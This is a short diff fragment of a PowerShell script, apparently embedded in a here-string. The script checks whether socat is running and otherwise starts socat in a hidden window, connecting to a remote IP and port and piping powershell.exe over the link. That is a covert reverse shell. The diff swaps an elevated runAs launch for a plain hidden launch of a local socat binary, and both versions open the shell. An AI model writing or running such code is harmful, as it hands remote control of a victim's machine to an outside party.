@@ -20,8 +20,7 @@ if(Get-Process -Name socat){
 
 }else{
 
-	Start-Process powershell.exe -Verb runAs -windowstyle hidden socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes	
-
+powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
 }
 '@)
 
